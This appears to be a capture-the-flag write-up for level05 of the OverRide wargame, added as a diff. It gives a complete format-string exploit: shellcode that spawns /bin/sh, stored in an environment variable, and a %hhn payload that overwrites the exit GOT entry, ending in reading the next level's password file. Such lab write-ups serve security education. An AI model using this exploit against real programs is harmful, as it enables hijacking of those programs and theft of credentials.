@@ -1,0 +1,64 @@
+scp -P 2223 level05@localhost:level05 /home/ncardozo/Documents/OverRide
+
+In the decompiler we can see that main does not have a return 
+instead it has an exit
+
+Also with objdump -d level05
+
+08048370 <exit@plt>:
+ 8048370: jmp DWORD PTR ds:0x80497e0
+
+The exit GOT is at 0x80497e0
+
+ NOTE :
+ GOT refers to the Global Offset Table, a memory section storing addresses 
+ of dynamically linked functions.  A GOT entry is a specific location within 
+ this table that holds the runtime address of a function or variable, often 
+ targeted in security exploits like Return Oriented Programming (ROP) because 
+ the GOT is writable.
+
+So we see that main calls printf and after exit. We'll ovewrite that entry with
+the address of our shellcode, so the program will jump to our code
+instead of exiting.
+
+echo "AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x." | ./level05
+
+buffer position 10
+
+This time we put our shell code in a A env var so we'll make the
+program jump to it. This desition is because we need the shell code
+to be in an address that we know:
+
+export A=`echo -e -n \
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"\
+"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"`
+
+To get that address:
+
+cat > /tmp/getaddr.c << 'EOF'
+#include <stdlib.h>
+#include <stdio.h>
+int main() { printf("%p\n", getenv("A")); return 0; }
+EOF
+gcc -m32 -o /tmp/getaddr /tmp/getaddr.c
+/tmp/getaddr
+
+0xffffd8c2
+
+Payload:
+
+python -c 'print \
+"\xe0\x97\x04\x08" + \
+"\xe1\x97\x04\x08" + \
+"\xe2\x97\x04\x08" + \
+"\xe3\x97\x04\x08" + \
+"%194c" + "%10$hhn" + \
+"%6c"   + "%11$hhn" + \
+"%39c"  + "%12$hhn" + "%13$hhn"' > /tmp/payload
+
+cat /tmp/payload - | ./level05
+
+cat /home/users/level06/.pass
